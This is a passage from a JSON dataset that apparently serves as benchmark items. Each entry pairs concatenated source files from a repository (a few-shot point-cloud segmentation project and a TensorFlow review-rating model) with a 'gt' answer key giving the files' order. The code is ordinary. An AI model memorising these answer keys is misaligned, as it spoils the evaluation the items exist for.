            "'fuckCoreMail/requests/packages/chardet/mbcsgroupprober.py'",
            "'fuckCoreMail/requests/packages/chardet/universaldetector.py'",
            "'fuckCoreMail/requests/packages/chardet/chardetect.py'"
        ]
    },
    {
        "files": [
            "'Seg-NN/models/seg_nn.py'",
            "'Seg-NN/runs/training.py'",
            "'Seg-NN/main.py'",
            "'Seg-NN/models/seg_learner.py'"
        ],
        "content": "'Seg-NN/models/seg_nn.py'\n:\nimport torch\nimport torch.nn as nn\nimport torch.nn.functional as F\n\nfrom models.encoder import Encoder_Seg\n\nclass SegNN(nn.Module):\n    def __init__(self, args):\n        super(SegNN, self).__init__()\n        self.n_way = args.n_way\n        self.k_shot = args.k_shot\n        self.dataset = args.dataset\n\n        if args.dataset == 's3dis':\n            self.encoder = Encoder_Seg(input_points=2048, num_stages=3, embed_dim=120, k_neighbors=16, de_neighbors=20,\n                                        alpha=1000, beta=30)\n        elif args.dataset == 'scannet':\n            self.encoder = Encoder_Seg(input_points=2048, num_stages=2, embed_dim=120, k_neighbors=16, de_neighbors=20,\n                                        alpha=1000, beta=20)\n        self.encoder.eval()\n\n    def forward(self, support_x, support_y, query_x, query_y):\n\n        N_way, K_shot, C, PN = support_x.shape\n\n        support_x = support_x.float().cuda().permute(0, 1, 3, 2).view(-1, PN, C)\n        support_y = support_y.float().cuda().view(N_way, K_shot, PN)\n        query_x = query_x.float().cuda().permute(0, 2, 1).view(-1, PN, C)\n        query_y = query_y.cuda().view(-1, PN)\n\n\n        with torch.no_grad():\n            support_features, support_XYZ_features = self.encoder(support_x)\n            support_features = support_features.permute(0, 2, 1)\n            support_features = support_features / torch.norm(support_features, dim=-1, keepdim=True)\n\n            support_XYZ_features = support_XYZ_features.permute(0, 2, 1)\n\n            feature_memory_list, XYZ_memory_list = [], []\n            label_memory_list = []\n            support_features, support_XYZ_features = support_features.view(N_way, K_shot, PN, -1), support_XYZ_features.view(N_way, K_shot, PN, -1)\n            for i in range(self.n_way):\n                mask_fg = (support_y[i] == 1)\n\n                fg_features = support_features[i, mask_fg]\n                fg_features = fg_features.mean(0).unsqueeze(0)\n                feature_memory_list.append(fg_features)\n                label_memory_list.append(torch.tensor(i+1).unsqueeze(0))\n\n                fg_XYZ_features = support_XYZ_features[i, mask_fg]\n                fg_XYZ_features = fg_XYZ_features.mean(0).unsqueeze(0)\n                XYZ_memory_list.append(fg_XYZ_features)\n\n\n            mask_bg = (support_y == 0)\n            bg_features = support_features[mask_bg]\n            bg_features = bg_features.mean(0).unsqueeze(0)\n            feature_memory_list.append(bg_features)\n            label_memory_list.append(torch.tensor(0).unsqueeze(0))\n\n            bg_XYZ_features = support_XYZ_features[mask_bg]\n            bg_XYZ_features = bg_XYZ_features.mean(0).unsqueeze(0)\n            XYZ_memory_list.append(bg_XYZ_features)\n\n            feature_memory = torch.cat(feature_memory_list, dim=0)\n            XYZ_memory = torch.cat(XYZ_memory_list, dim=0)\n\n            label_memory = torch.cat(label_memory_list, dim=0).cuda()\n            label_memory = F.one_hot(label_memory, num_classes=self.n_way+1)\n\n            feature_memory = feature_memory / torch.norm(feature_memory, dim=-1, keepdim=True)\n            feature_memory = feature_memory.permute(1, 0)\n            XYZ_memory = XYZ_memory / torch.norm(XYZ_memory, dim=-1, keepdim=True)\n            XYZ_memory = XYZ_memory.permute(1, 0)\n\n            query_features, query_XYZ_features = self.encoder(query_x)\n            query_features = query_features.permute(0, 2, 1)\n            query_features /= query_features.norm(dim=-1, keepdim=True)\n\n            query_XYZ_features = query_XYZ_features.permute(0, 2, 1)\n            query_XYZ_features /= query_XYZ_features.norm(dim=-1, keepdim=True)\n\n            Sim = query_features @ feature_memory\n            Sim_XYZ = query_XYZ_features @ XYZ_memory\n\n            if self.dataset == 's3dis':\n                logits = (-100 * (1 - Sim)).exp() @ label_memory.float()\n                logits_XYZ = (-100 * (1 - Sim_XYZ)).exp() @ label_memory.float()\n            elif self.dataset == 'scannet':\n                logits = (-100 * (1 - Sim)).exp() @ label_memory.float()\n                logits_XYZ = (-100 * (1 - Sim_XYZ)).exp() @ label_memory.float()\n            logits = logits + logits_XYZ\n\n            logits = F.softmax(logits, dim=-1)\n\n        return logits, 0\n\n\n\n\n'Seg-NN/runs/training.py'\n:\nimport os\nimport torch\nfrom torch.utils.data import DataLoader\nfrom torch.utils.tensorboard import SummaryWriter\n\nfrom runs.training_free import test_few_shot\nfrom dataloaders.loader import MyDataset, MyTestDataset, batch_task_collate\nfrom models.seg_learner import Learner\nfrom utils.cuda_util import cast_cuda\nfrom utils.logger import init_logger\nfrom utils.checkpoint_util import load_model_checkpoint\n\n\ndef train(args):\n    logger = init_logger(args.log_dir, args)\n    PL = Learner(args)\n\n    PC_AUGMENT_CONFIG = {'scale': args.pc_augm_scale,\n                         'rot': args.pc_augm_rot,\n                         'mirror_prob': args.pc_augm_mirror_prob,\n                         'jitter': args.pc_augm_jitter,\n                         'shift': args.pc_augm_shift,\n                         'random_color': args.pc_augm_color,\n                         }\n\n    TRAIN_DATASET = MyDataset(args.data_path, args.dataset, cvfold=args.cvfold, num_episode=args.n_iters,\n                              n_way=args.n_way, k_shot=args.k_shot, n_queries=args.n_queries,\n                              phase=args.model, mode='train',\n                              num_point=args.pc_npts, pc_attribs=args.pc_attribs,\n                              pc_augm=args.pc_augm, pc_augm_config=PC_AUGMENT_CONFIG,\n                              way_ratio=args.way_pcratio, way_num=args.way_pcnum)\n\n    VALID_DATASET = MyTestDataset(args.model, args.data_path, args.dataset, cvfold=args.cvfold,\n                                  num_episode_per_comb=args.n_episode_test,\n                                  n_way=args.n_way, k_shot=args.k_shot, n_queries=args.n_queries,\n                                  num_point=args.pc_npts, pc_attribs=args.pc_attribs,\n                                  way_ratio=args.way_pcratio, way_num=args.way_pcnum)\n\n    VALID_CLASSES = list(VALID_DATASET.classes)\n\n    TRAIN_LOADER = DataLoader(TRAIN_DATASET, batch_size=1, collate_fn=batch_task_collate)\n    VALID_LOADER = DataLoader(VALID_DATASET, batch_size=1, collate_fn=batch_task_collate)\n\n    WRITER = SummaryWriter(log_dir=args.log_dir)\n\n    TEST_DATASET = MyTestDataset(args.model, args.data_path, args.dataset, cvfold=args.cvfold,\n                                 num_episode_per_comb=args.n_episode_test,\n                                 n_way=args.n_way, k_shot=args.k_shot, n_queries=args.n_queries,\n                                 num_point=args.pc_npts, pc_attribs=args.pc_attribs,\n                                 way_ratio=args.way_pcratio, way_num=args.way_pcnum, mode='test')\n\n    TEST_CLASSES = list(TEST_DATASET.classes)\n    TEST_LOADER = DataLoader(TEST_DATASET, batch_size=1, shuffle=False, collate_fn=batch_task_collate)\n\n\n    best_iou = 0\n    for batch_idx, (data, sampled_classes) in enumerate(TRAIN_LOADER):\n\n        data = cast_cuda(data)\n        loss, accuracy = PL.train(data)\n        if (batch_idx+1) % 500 == 0:\n            logger.cprint('=====[Train] Iter: %d | Loss: %.4f | Accuracy: %f =====' % (batch_idx, loss, accuracy))\n            WRITER.add_scalar('Train/loss', loss, batch_idx)\n            WRITER.add_scalar('Train/accuracy', accuracy, batch_idx)\n\n        if (batch_idx+1) % args.eval_interval == 0:\n            mean_IoU = test_few_shot(VALID_LOADER, PL, logger, VALID_CLASSES)\n            logger.cprint('\\n=====[Valid]  Mean IoU: %f =====\\n' % (mean_IoU))\n\n            WRITER.add_scalar('Valid/meanIoU', mean_IoU, batch_idx)\n            if mean_IoU > best_iou:\n                best_iou = mean_IoU\n                logger.cprint('*******************Model Saved*******************')\n                save_dict = {'iteration': batch_idx + 1,\n                             'model': PL.model,\n                             'IoU': best_iou}\n                torch.save(save_dict, os.path.join(args.log_dir, 'checkpoint.pt'))\n\n            logger.cprint('=====Mean Valid IoU Is: %f =====' % (mean_IoU))\n            logger.cprint('=====Best Valid IoU Is: %f =====' % (best_iou))\n\n    PL.model = load_model_checkpoint(args.log_dir)\n    test_IoU = test_few_shot(TEST_LOADER, PL, logger, TEST_CLASSES)\n    logger.cprint('\\n=====[TEST]  Mean IoU: %f =====\\n' % (test_IoU))\n\n    WRITER.close()\n\n'Seg-NN/main.py'\n:\nimport os\nimport ast\nimport torch\nimport argparse\nimport numpy as np\n\n\nif __name__ == '__main__':\n\n\n\n\n\n\n\n\n\n\n\n\n\n    parser = argparse.ArgumentParser()\n\n    parser.add_argument('--model', type=str, default='segnn', choices=['segnn', 'segpn', 'segpn_eval'])\n    parser.add_argument('--dataset', type=str, default='s3dis', help='Dataset name: s3dis|scannet')\n    parser.add_argument('--cvfold', type=int, default=0, help='Fold left-out for testing in leave-one-out setting ''Options:{0,1}')\n    parser.add_argument('--data_path', type=str, default='./datasets/S3DIS/blocks_bs1_s1', help='Directory to the source data')\n    parser.add_argument('--save_path', type=str, default='./log_s3dis/', help='Directory to save log and checkpoints')\n    parser.add_argument('--eval_interval', type=int, default=2000, help='iteration/epoch inverval to evaluate model')\n\n\n    parser.add_argument('--batch_size', type=int, default=1, help='Number of samples/tasks in one batch')\n    parser.add_argument('--n_workers', type=int, default=4, help='number of workers to load data')\n    parser.add_argument('--n_iters', type=int, default=20000, help='number of iterations/epochs to train')\n\n    parser.add_argument('--lr', type=float, default=0.001, help='Model learning rate [default: 0.001]')\n    parser.add_argument('--step_size', type=int, default=5000, help='Iterations of learning rate decay')\n    parser.add_argument('--gamma', type=float, default=0.5, help='Multiplicative factor of learning rate decay')\n\n\n    parser.add_argument('--n_way', type=int, default=2, help='Number of classes for each episode: 2|3')\n    parser.add_argument('--k_shot', type=int, default=1, help='Number of samples/shots for each class: 1|5')\n    parser.add_argument('--n_queries', type=int, default=1, help='Number of queries for each class')\n    parser.add_argument('--n_episode_test', type=int, default=100,\n                        help='Number of episode per configuration during testing')\n\n\n    parser.add_argument('--pc_npts', type=int, default=2048, help='Number of input points for each block.')\n    parser.add_argument('--pc_attribs', default='xyzrgbXYZ',\n                        help='Point attributes fed to PointNets, if empty then all possible. '\n                             'xyz = coordinates, rgb = color, XYZ = normalized xyz')\n    parser.add_argument('--way_pcratio', default='[0.05, 0.05]',\n                        help='The least ratio of points for each target class in the point cloud.')\n    parser.add_argument('--way_pcnum', default='[100, 100]',\n                        help='The least number of points for each target class in the point cloud.')\n    parser.add_argument('--pc_augm', action='store_true', help='Training augmentation for points in each superpoint')\n    parser.add_argument('--pc_augm_scale', type=float, default=0,\n                        help='Training augmentation: Uniformly random scaling in [1/scale, scale]')\n    parser.add_argument('--pc_augm_rot', type=int, default=1,\n                        help='Training augmentation: Bool, random rotation around z-axis')\n    parser.add_argument('--pc_augm_mirror_prob', type=float, default=0,\n                        help='Training augmentation: Probability of mirroring about x or y axes')\n    parser.add_argument('--pc_augm_jitter', type=int, default=1,\n                        help='Training augmentation: Bool, Gaussian jittering of all attributes')\n    parser.add_argument('--pc_augm_shift', type=float, default=0,\n                        help='Training augmentation: Probability of shifting points')\n    parser.add_argument('--pc_augm_color', type=int, default=0,\n                        help='Training augmentation: Bool, random color of all attributes')\n\n    args = parser.parse_args()\n    print('Dataset:  ', args.dataset)\n    print('CV Fold:  ', args.cvfold)\n    print('Num Way:  ', args.n_way)\n    print('Num Shot: ', args.k_shot)\n    print('PC Ratio: ', args.way_pcratio, args.way_pcnum)\n\n    args.way_pcratio = ast.literal_eval(args.way_pcratio)\n    args.way_pcnum = ast.literal_eval(args.way_pcnum)\n\n    args.pc_in_dim = len(args.pc_attribs)\n\n\n    if args.model == 'segpn':\n        args.log_dir = args.save_path + 'log_S%d_N%d_K%d' % (args.cvfold, args.n_way, args.k_shot)\n        from runs.training import train\n        train(args)\n    elif args.model == 'segnn':\n        args.log_dir = args.save_path + 'log_S%d_N%d_K%d' % (args.cvfold, args.n_way, args.k_shot)\n        from runs.training_free import training_free\n        training_free(args)\n    elif args.model == 'segpn_eval':\n        args.log_dir = args.save_path + 'log_S%d_N%d_K%d' % (args.cvfold, args.n_way, args.k_shot)\n        from runs.evaluate import eval\n        eval(args)\n    else:\n        raise ValueError('Please set correct phase.')\n\n\n\n'Seg-NN/models/seg_learner.py'\n:\nimport torch\nfrom torch import optim\nfrom torch.nn import functional as F\n\nfrom models.seg_nn import SegNN\nfrom models.seg_pn import SegPN\n\n\nclass Learner(object):\n    def __init__(self, args):\n\n\n        if args.model == 'segnn':\n            self.model = SegNN(args)\n        elif args.model == 'segpn' or args.model == 'segpn_eval':\n            self.model = SegPN(args)\n\n        if args.model == 'segpn':\n            print('SegPN and setting optimizer : ')\n            self.optimizer = torch.optim.AdamW([{'params': self.model.bn.parameters()},\n                                                {'params': self.model.fc.parameters()},\n                                                {'params': self.model.quest.parameters()}], lr=args.lr, weight_decay=0.1)\n            self.lr_scheduler = optim.lr_scheduler.StepLR(self.optimizer, step_size=args.step_size, gamma=args.gamma)\n\n        self.model.cuda()\n\n    def train(self, data):\n\n        self.model.train()\n        [support_x, support_y, query_x, query_y] = data\n\n        query_logits, loss = self.model(support_x, support_y, query_x, query_y)\n\n        self.optimizer.zero_grad()\n        loss.backward()\n\n        self.optimizer.step()\n        self.lr_scheduler.step()\n\n        query_pred = F.softmax(query_logits, dim=-1).argmax(dim=-1)\n\n        correct = torch.eq(query_pred, query_y).sum().item()\n        accuracy = correct / (query_y.shape[0] * query_y.shape[1])\n\n        return loss, accuracy\n\n    def test(self, data):\n        \"\"\"\n        Args:\n            support_x: support point clouds with shape (n_way, k_shot, in_channels, num_points)\n            support_y: support masks (foreground) with shape (n_way, k_shot, num_points), each point \\in {0,1}.\n            query_x: query point clouds with shape (n_queries, in_channels, num_points)\n            query_y: query labels with shape (n_queries, num_points), each point \\in {0,..., n_way}\n        \"\"\"\n        self.model.eval()\n        [support_x, support_y, query_x, query_y] = data\n\n        with torch.no_grad():\n            logits, _ = self.model(support_x, support_y, query_x, query_y)\n\n            pred = F.softmax(logits, dim=-1).argmax(dim=-1)\n\n            correct = torch.eq(pred, query_y).sum().item()\n            accuracy = correct / (query_y.shape[0] * query_y.shape[1])\n\n        return pred, accuracy\n\n",
        "gt": [
            "'Seg-NN/models/seg_nn.py'",
            "'Seg-NN/models/seg_learner.py'",
            "'Seg-NN/runs/training.py'",
            "'Seg-NN/main.py'"
        ]
    },
    {
        "files": [
            "'vista-net/data_preprocess.py'",
            "'vista-net/train.py'",
            "'vista-net/model.py'"
        ],
        "content": "'vista-net/data_preprocess.py'\n:import json\nimport os\nimport pickle\nimport sys\nfrom collections import defaultdict\nfrom tqdm import tqdm\n\ncities = ['Boston', 'Chicago', 'Los Angeles', 'New York', 'San Francisco']\n\ndata_dir = 'data'\n\ntrain_raw_file = os.path.join(data_dir, 'train.json')\nvalid_raw_file = os.path.join(data_dir, 'valid.json')\n\ntrain_file = os.path.join(data_dir, 'train.pickle')\nvalid_file = os.path.join(data_dir, 'valid.pickle')\nvocab_file = os.path.join(data_dir, 'vocab.pickle')\nword_freq_file = os.path.join(data_dir, 'word-freq.pickle')\n\nVOCAB_SIZE = 40000\nUNK = 2\nSENT_DELIMITER = '|||'\n\n\ndef read_reviews(file_path):\n  reviews = []\n  with open(file_path, 'r') as f:\n    for line in tqdm(f):\n      review = json.loads(line)\n      photos = []\n      for photo in review['Photos']:\n        photos.append(photo['_id'])\n      reviews.append({'_id': review['_id'],\n                      'Text': review['Text'],\n                      'Photos': photos,\n                      'Rating': review['Rating']})\n  return reviews\n\n\ndef word_tokenize(text):\n  for sent in text.split(SENT_DELIMITER):\n    for word in sent.split():\n      yield word\n\n\ndef build_word_freq():\n  try:\n    with open(word_freq_file, 'rb') as freq_dist_f:\n      freq_dist_f = pickle.load(freq_dist_f)\n      print('word frequency loaded')\n      return freq_dist_f\n  except IOError:\n    pass\n\n  print('building word frequency')\n  word_freq = defaultdict(int)\n\n  for i, review in enumerate(read_reviews(train_raw_file)):\n    for word in word_tokenize(review['Text']):\n      word_freq[word] += 1\n\n  for i, review in enumerate(read_reviews(valid_raw_file)):\n    for word in word_tokenize(review['Text']):\n      word_freq[word] += 1\n  with open(word_freq_file, 'wb') as f:\n    pickle.dump(word_freq, f)\n  return word_freq\n\n\ndef build_vocabulary():\n  print('building vocabulary')\n  word_freq = build_word_freq()\n  top_words = sorted(word_freq.items(), key=lambda x: -x[1])[:VOCAB_SIZE - 3]\n  print('most common word is %s which appears %d times' % (top_words[0][0], top_words[0][1]))\n  print('less common word is %s which appears %d times' % (top_words[-1][0], top_words[-1][1]))\n  vocab = {}\n  i = 3\n  for word, freq in top_words:\n    vocab[word] = i\n    i += 1\n  with open(vocab_file, 'wb') as f:\n    pickle.dump(vocab, f)\n\n\ndef load_vocabulary():\n  try:\n    with open(vocab_file, 'rb') as f:\n      vocab = pickle.load(f)\n      print('Vocabulary loaded')\n      return vocab\n  except IOError:\n    print('Can not load vocabulary')\n    sys.exit(0)\n\n\ndef dump_file(input_file, output_file):\n  if os.path.exists(output_file):\n    print('%s is dumped already' % output_file)\n    return\n\n  vocab = load_vocabulary()\n  print('start dumping %s into %s' % (input_file, output_file))\n  f = open(output_file, 'wb')\n  try:\n    for review in read_reviews(input_file):\n      rating = review['Rating']\n      photos = review['Photos']\n      text = []\n      for sent in review['Text'].split(SENT_DELIMITER):\n        text.append([vocab.get(word, UNK) for word in sent.split()])\n      pickle.dump((text, photos, rating), f)\n  except KeyboardInterrupt:\n    pass\n  f.close()\n\n\nif __name__ == '__main__':\n  build_vocabulary()\n\n  dump_file(train_raw_file, train_file)\n  dump_file(valid_raw_file, valid_file)\n  for city in cities:\n    dump_file(os.path.join(data_dir, 'test/{}_test.json'.format(city)),\n              os.path.join(data_dir, 'test/{}_test.pickle'.format(city)))\n\n'vista-net/train.py'\n:import os\nimport gpu_utils\n\ngpu_utils.setup_one_gpu()\n\nimport tensorflow as tf\nfrom datetime import datetime\n\nfrom data_reader import DataReader\nfrom data_preprocess import cities\n\nfrom model import VistaNet\nfrom model_utils import count_parameters\n\n\n\nFLAGS = tf.flags.FLAGS\n\ntf.flags.DEFINE_string(\"checkpoint_dir\", 'checkpoints',\n                       )\ntf.flags.DEFINE_string(\"log_dir\", 'log',\n                       )\n\ntf.flags.DEFINE_integer(\"num_checkpoints\", 1,\n                        )\ntf.flags.DEFINE_integer(\"num_epochs\", 20,\n                        )\ntf.flags.DEFINE_integer(\"batch_size\", 32,\n                        )\ntf.flags.DEFINE_integer(\"display_step\", 20,\n                        )\n\ntf.flags.DEFINE_float(\"learning_rate\", 0.001,\n                      )\ntf.flags.DEFINE_float(\"max_grad_norm\", 5.0,\n                      )\ntf.flags.DEFINE_float(\"dropout_keep_prob\", 0.5,\n                      )\n\ntf.flags.DEFINE_integer(\"hidden_dim\", 50,\n                        )\ntf.flags.DEFINE_integer(\"att_dim\", 100,\n                        )\ntf.flags.DEFINE_integer(\"emb_size\", 200,\n                        )\ntf.flags.DEFINE_integer(\"num_images\", 3,\n                        )\ntf.flags.DEFINE_integer(\"num_classes\", 5,\n                        )\n\ntf.flags.DEFINE_boolean(\"allow_soft_placement\", True,\n                        )\n\ntrain_summary_writer = tf.summary.FileWriter(FLAGS.log_dir + '/train')\nvalid_summary_writer = tf.summary.FileWriter(FLAGS.log_dir + '/valid')\n\nvalid_step = 0\n\ndef evaluate(session, dataset, model, loss, accuracy, summary_op=None):\n  sum_loss = 0.0\n  sum_acc = 0.0\n  example_count = 0\n  global valid_step\n\n  for reviews, images, labels in dataset:\n    feed_dict = model.get_feed_dict(reviews, images, labels)\n    _loss, _acc = session.run([loss, accuracy], feed_dict=feed_dict)\n    if not summary_op is None:\n      _summary = session.run(summary_op, feed_dict=feed_dict)\n      valid_summary_writer.add_summary(_summary, global_step=valid_step)\n      valid_step += len(labels)\n\n    sum_loss += _loss * len(labels)\n    sum_acc += _acc * len(labels)\n    example_count += len(labels)\n\n  avg_loss = sum_loss / example_count\n  avg_acc = sum_acc / example_count\n  return avg_loss, avg_acc\n\n\ndef test(session, data_reader, model, loss, accuracy, epoch, result_file):\n  for city in cities:\n    test_loss, test_acc = evaluate(session, data_reader.read_test_set(city),\n                                   model, loss, accuracy)\n    result_file.write('city={},epoch={},loss={:.4f},acc={:.4f}\\n'.format(city, epoch, test_loss, test_acc))\n  result_file.flush()\n\n\ndef train(session, data_reader, model, train_op, loss, accuracy, summary_op):\n  for reviews, images, labels in data_reader.read_train_set(batch_size=FLAGS.batch_size):\n    step, _, _loss, _acc = session.run([model.global_step, train_op, loss, accuracy],\n                                       feed_dict=model.get_feed_dict(reviews, images, labels,\n                                                                     FLAGS.dropout_keep_prob))\n    if step % FLAGS.display_step == 0:\n      _summary = session.run(summary_op, feed_dict=model.get_feed_dict(reviews, images, labels,\n                                                                       dropout_keep_prob=1.0))\n      train_summary_writer.add_summary(_summary, global_step=step)\n\n\ndef loss_fn(labels, logits):\n  onehot_labels = tf.one_hot(labels, depth=FLAGS.num_classes)\n  cross_entropy_loss = tf.losses.softmax_cross_entropy(\n    onehot_labels=onehot_labels,\n    logits=logits\n  )\n  tf.summary.scalar('loss', cross_entropy_loss)\n  return cross_entropy_loss\n\n\ndef train_fn(loss, global_step):\n  trained_vars = tf.trainable_variables()\n  count_parameters(trained_vars)\n\n\n  gradients = tf.gradients(loss, trained_vars)\n  clipped_grads, global_norm = tf.clip_by_global_norm(gradients, FLAGS.max_grad_norm)\n  tf.summary.scalar('global_grad_norm', global_norm)\n\n\n\n\n\n\n\n\n  optimizer = tf.train.RMSPropOptimizer(FLAGS.learning_rate)\n  train_op = optimizer.apply_gradients(zip(clipped_grads, trained_vars),\n                                       name='train_op',\n                                       global_step=global_step)\n  return train_op\n\n\ndef eval_fn(labels, logits):\n  prediction = tf.argmax(logits, axis=-1)\n  corrected_pred = tf.equal(prediction, tf.cast(labels, tf.int64))\n  accuracy = tf.reduce_mean(tf.cast(corrected_pred, tf.float32))\n  tf.summary.scalar('accuracy', accuracy)\n  return accuracy\n\n\ndef main(_):\n  config = tf.ConfigProto(allow_soft_placement=FLAGS.allow_soft_placement)\n  with tf.Session(config=config) as sess:\n    print('\\n{} Model initializing'.format(datetime.now()))\n\n    model = VistaNet(FLAGS.hidden_dim, FLAGS.att_dim, FLAGS.emb_size, FLAGS.num_images, FLAGS.num_classes)\n    loss = loss_fn(model.labels, model.logits)\n    train_op = train_fn(loss, model.global_step)\n    accuracy = eval_fn(model.labels, model.logits)\n    summary_op = tf.summary.merge_all()\n\n    sess.run(tf.global_variables_initializer())\n    train_summary_writer.add_graph(sess.graph)\n    saver = tf.train.Saver(max_to_keep=FLAGS.num_checkpoints)\n    data_reader = DataReader(num_images=FLAGS.num_images, train_shuffle=True)\n\n    print('\\n{} Start training'.format(datetime.now()))\n\n    epoch = 0\n    best_loss = float('inf')\n    while epoch < FLAGS.num_epochs:\n      epoch += 1\n      print('\\n=> Epoch: {}'.format(epoch))\n\n      train(sess, data_reader, model, train_op, loss, accuracy, summary_op)\n\n      print('=> Evaluation')\n      print('best_loss={:.4f}'.format(best_loss))\n      valid_loss, valid_acc = evaluate(sess, data_reader.read_valid_set(batch_size=FLAGS.batch_size),\n                                       model, loss, accuracy, summary_op)\n      print('valid_loss={:.4f}, valid_acc={:.4f}'.format(valid_loss, valid_acc))\n\n      if valid_loss < best_loss:\n        best_loss = valid_loss\n        save_path = os.path.join(FLAGS.checkpoint_dir,\n                                 'epoch={}-loss={:.4f}-acc={:.4f}'.format(epoch, valid_loss, valid_acc))\n        saver.save(sess, save_path)\n        print('Best model saved @ {}'.format(save_path))\n\n        print('=> Testing')\n        result_file = open(\n          os.path.join(FLAGS.log_dir, 'loss={:.4f},acc={:.4f},epoch={}'.format(valid_loss, valid_acc, epoch)), 'w')\n        test(sess, data_reader, model, loss, accuracy, epoch, result_file)\n\n  print(\"{} Optimization Finished!\".format(datetime.now()))\n\n\nif __name__ == '__main__':\n  tf.app.run()\n\n'vista-net/model.py'\n:import tensorflow as tf\nimport tensorflow.contrib.rnn as rnn\n\nfrom data_utils import batch_review_normalize, batch_image_normalize\nfrom layers import bidirectional_rnn, text_attention, visual_aspect_attention\nfrom model_utils import get_shape, load_glove\n\nfrom data_preprocess import VOCAB_SIZE\n\n\nclass VistaNet:\n\n  def __init__(self, hidden_dim, att_dim, emb_size, num_images, num_classes):\n    self.hidden_dim = hidden_dim\n    self.att_dim = att_dim\n    self.emb_size = emb_size\n    self.num_classes = num_classes\n    self.num_images = num_images\n\n    self.global_step = tf.Variable(0, name='global_step', trainable=False)\n    self.dropout_keep_prob = tf.placeholder(dtype=tf.float32, name='dropout_keep_prob')\n\n    self.documents = tf.placeholder(shape=(None, None, None), dtype=tf.int32, name='reviews')\n    self.document_lengths = tf.placeholder(shape=(None,), dtype=tf.int32, name='review_lengths')\n    self.sentence_lengths = tf.placeholder(shape=(None, None), dtype=tf.int32, name='sentence_lengths')\n\n    self.max_num_words = tf.placeholder(dtype=tf.int32, name='max_num_words')\n    self.max_num_sents = tf.placeholder(dtype=tf.int32, name='max_num_sents')\n\n    self.images = tf.placeholder(shape=(None, None, 4096), dtype=tf.float32, name='images')\n    self.labels = tf.placeholder(shape=(None), dtype=tf.int32, name='labels')\n\n    with tf.variable_scope('VistaNet'):\n      self._init_embedding()\n      self._init_word_encoder()\n      self._init_sent_encoder()\n      self._init_classifier()\n\n  def _init_embedding(self):\n    with tf.variable_scope('embedding'):\n      self.embedding_matrix = tf.get_variable(\n        name='embedding_matrix',\n        shape=[VOCAB_SIZE, self.emb_size],\n        initializer=tf.constant_initializer(load_glove(VOCAB_SIZE, self.emb_size)),\n        dtype=tf.float32\n      )\n      self.embedded_inputs = tf.nn.embedding_lookup(self.embedding_matrix, self.documents)\n\n  def _init_word_encoder(self):\n    with tf.variable_scope('word') as scope:\n      word_rnn_inputs = tf.reshape(\n        self.embedded_inputs,\n        [-1, self.max_num_words, self.emb_size]\n      )\n      sentence_lengths = tf.reshape(self.sentence_lengths, [-1])\n\n\n      cell_fw = rnn.GRUCell(self.hidden_dim)\n      cell_bw = rnn.GRUCell(self.hidden_dim)\n\n      init_state_fw = tf.tile(tf.get_variable('init_state_fw',\n                                              shape=[1, self.hidden_dim],\n                                              initializer=tf.constant_initializer(1.0)),\n                              multiples=[get_shape(word_rnn_inputs)[0], 1])\n      init_state_bw = tf.tile(tf.get_variable('init_state_bw',\n                                              shape=[1, self.hidden_dim],\n                                              initializer=tf.constant_initializer(1.0)),\n                              multiples=[get_shape(word_rnn_inputs)[0], 1])\n\n      word_rnn_outputs, _ = bidirectional_rnn(\n        cell_fw=cell_fw,\n        cell_bw=cell_bw,\n        inputs=word_rnn_inputs,\n        input_lengths=sentence_lengths,\n        initial_state_fw=init_state_fw,\n        initial_state_bw=init_state_bw,\n        scope=scope\n      )\n\n      self.word_outputs, self.word_att_weights = text_attention(inputs=word_rnn_outputs,\n                                                                att_dim=self.att_dim,\n                                                                sequence_lengths=sentence_lengths)\n\n      self.word_outputs = tf.nn.dropout(self.word_outputs, keep_prob=self.dropout_keep_prob)\n\n  def _init_sent_encoder(self):\n    with tf.variable_scope('sentence') as scope:\n      sentence_rnn_inputs = tf.reshape(self.word_outputs, [-1, self.max_num_sents, 2 * self.hidden_dim])\n\n\n      cell_fw = rnn.GRUCell(self.hidden_dim)\n      cell_bw = rnn.GRUCell(self.hidden_dim)\n\n      init_state_fw = tf.tile(tf.get_variable('init_state_fw',\n                                              shape=[1, self.hidden_dim],\n                                              initializer=tf.constant_initializer(1.0)),\n                              multiples=[get_shape(sentence_rnn_inputs)[0], 1])\n      init_state_bw = tf.tile(tf.get_variable('init_state_bw',\n                                              shape=[1, self.hidden_dim],\n                                              initializer=tf.constant_initializer(1.0)),\n                              multiples=[get_shape(sentence_rnn_inputs)[0], 1])\n\n      sentence_rnn_outputs, _ = bidirectional_rnn(\n        cell_fw=cell_fw,\n        cell_bw=cell_bw,\n        inputs=sentence_rnn_inputs,\n        input_lengths=self.document_lengths,\n        initial_state_fw=init_state_fw,\n        initial_state_bw=init_state_bw,\n        scope=scope\n      )\n\n      self.sentence_outputs, self.sent_att_weights, self.img_att_weights = visual_aspect_attention(\n          text_input=sentence_rnn_outputs,\n          visual_input=self.images,\n          att_dim=self.att_dim,\n          sequence_lengths=self.document_lengths\n        )\n\n      self.sentence_outputs = tf.nn.dropout(self.sentence_outputs, keep_prob=self.dropout_keep_prob)\n\n  def _init_classifier(self):\n    with tf.variable_scope('classifier'):\n      self.logits = tf.layers.dense(\n        inputs=self.sentence_outputs,\n        units=self.num_classes,\n        name='logits'\n      )\n\n  def get_feed_dict(self, reviews, images, labels, dropout_keep_prob=1.0):\n    norm_docs, doc_sizes, sent_sizes, max_num_sents, max_num_words = batch_review_normalize(reviews)\n    fd = {\n      self.documents: norm_docs,\n      self.document_lengths: doc_sizes,\n      self.sentence_lengths: sent_sizes,\n      self.max_num_sents: max_num_sents,\n      self.max_num_words: max_num_words,\n      self.images: batch_image_normalize(images, self.num_images),\n      self.labels: labels,\n      self.dropout_keep_prob: dropout_keep_prob\n    }\n    return fd",
        "gt": [
            "'vista-net/data_preprocess.py'",
            "'vista-net/model.py'",
            "'vista-net/train.py'"
        ]
    },
    {
        "files": [
            "'blackbox-deep-graph-matching/train_eval.py'",
            "'blackbox-deep-graph-matching/data/data_loader_multigraph.py'",
            "'blackbox-deep-graph-matching/utils/build_graphs.py'"
        ],
